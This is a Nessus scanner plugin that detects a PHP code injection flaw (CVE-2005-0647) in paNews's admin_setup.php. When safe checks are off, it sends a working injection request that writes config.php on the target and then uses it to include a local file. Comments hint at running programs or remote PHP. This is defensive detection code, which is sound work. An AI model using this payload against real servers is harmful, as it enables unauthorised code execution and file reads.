#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#



include('deprecated_nasl_level.inc');
include('compat.inc');

if (description) {
  script_id(17201);
  script_version("1.20");
  script_cve_id("CVE-2005-0647");
  script_bugtraq_id(12611);

  script_name(english:"paNews admin_setup.php Multiple Parameter Arbitrary PHP Code Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of paNews that fails to properly
sanitize input passed to the script 'includes/admin_setup.php' and, in
addition, allows writes by the web user to the directory 'includes'
(not the default configuration).  Taken together, these flaws allow a
remote attacker to run arbitrary code in the context of the user
running the web service or to read arbitrary files on the target." );
 script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2005/Feb/523" );
 script_set_attribute(attribute:"solution", value:
"Change the permissions on the 'includes/' directory so that the web
user cannot write to it." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"false");



 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/23");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/03/02");
 script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for remote code execution in admin_setup.php in paNews");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");
  script_family(english:"CGI abuses");
 
  script_dependencies("panews_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item("www/" + port + "/panews");
if (isnull(install)) exit(0);
matches = pregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = data_protection::sanitize_user_paths(report_text:matches[2]);

  if (safe_checks()) {
    if (ver =~  "^([0-1]\.|2\.0b[0-4])$") {
      security_hole(port:port, extra: 
"***** Nessus has determined the vulnerability exists on the target
***** simply by looking at the version number of paNews
***** installed there.
");
    }
  }
  else {
    # Create includes/config.php.
    r = http_send_recv3(method:"GET", port: port,
      # nb: with a slightly different URL, you can run programs on the target.
      item:dir + "/includes/admin_setup.php?access[]=admins&do=updatesets&form[comments]=$nst&form[autoapprove]=$nst&disvercheck=$nst&installed=$asd&showcopy=include($nst)");
    if (isnull(r)) exit(0);

    if (r[0] =~ "^HTTP/.* 200 OK") {
      # And now run it to include paNews Readme.txt in the top-level directory.
      r = http_send_recv3(method:"GET", port: port, 
        # nb: if PHP's allow_url_fopen is enabled, you could also open
        #     remote URLs with arbitrary PHP code.
        item:dir + "/includes/config.php?nst=../Readme.txt" );
      if (isnull(r)) exit(0);
      res = r[2];
      if ("bugs@phparena.net" >< res) {
         security_hole(port:port, extra:
string(
 "*****     ", dir + "/includes/config.php\n",
 "***** in the webserver's document directory. This file should be\n",
 "***** deleted as soon as possible.\n\n"));
    }
    }
  }
}
